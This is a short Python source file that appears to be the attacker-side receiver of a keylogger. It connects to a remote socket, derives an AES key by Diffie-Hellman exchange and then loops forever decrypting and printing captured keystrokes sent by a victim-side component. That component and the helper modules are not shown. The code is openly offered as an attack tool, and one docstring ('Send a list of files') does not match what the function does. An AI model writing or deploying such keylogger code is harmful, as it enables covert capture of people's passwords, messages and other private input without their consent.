from packet import *
from dhaes import *
import json
import socket
import base64

def attacker_socket(ADDRESS: tuple,):
    '''
    Send a list of files
    '''
    AttackerSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    AttackerSocket.connect(ADDRESS)
    
    KEY = gen_key_dh(AttackerSocket)

 
    while True:
            keystroke_packet = receive_packet(AttackerSocket)
            nonce = keystroke_packet.get_header(False)
            keystroke = decrypt_mex(KEY, nonce, keystroke_packet.get_data(False))
            print(keystroke)


def gen_key_dh(AttackerSocket: socket.socket) -> bytes:
    '''
    Gets modp from "sambiochiavi/modp/" based on key lenght,
    Generate a, with A and returns an AES key based off the common
    secret with the other AttackerSocket.
    '''
    #Get p from the files
    with open(f"8192-bit.txt",'r') as p_file:
        p = p_file.readlines()
    stripped_lines = [line.strip('\n') for line in p]
    modp = int("".join(stripped_lines),16)


    a = rand() 
    A = calcola(2,a,modp)
    pgA = { 'p' : modp, 'g' : 2 , 'A': A}

    B = send_pgA(pgA,AttackerSocket)
    K = calcolaK(B,a,pgA['p'])
    Kb = str(K).encode('utf-8')

    return key_AES(Kb)

def send_pgA(pgA: dict, AttackerSocket: socket.socket) -> int:
    '''
    Sends modp, generator and A.

    Returns B from the listener.
    '''

    pgA_Packet = Packet("PGAX",json.dumps(pgA))

    AttackerSocket.sendall(pgA_Packet.raw_packet())


    B = receive_packet(AttackerSocket)
    B = int(B.data)
    return B